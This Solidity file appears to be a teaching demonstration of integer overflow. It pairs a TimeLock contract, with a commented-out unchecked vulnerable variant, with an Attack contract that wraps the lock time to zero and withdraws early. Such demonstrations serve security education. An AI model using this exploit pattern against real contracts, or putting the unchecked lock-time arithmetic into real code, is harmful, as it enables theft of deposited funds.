// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
        // unchecked {
        //     lockTime[msg.sender] += _secondsToIncrease;
        // }
        /// @dev if unchecked is used, then attacker can cause overflow and withdraw funds without waiting for a week
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }

    function currentTime() external view returns (uint256) {
        return block.timestamp;
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    receive() external payable {}

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(type(uint256).max + 1 - timeLock.lockTime(address(this)));
        timeLock.withdraw();
    }
}
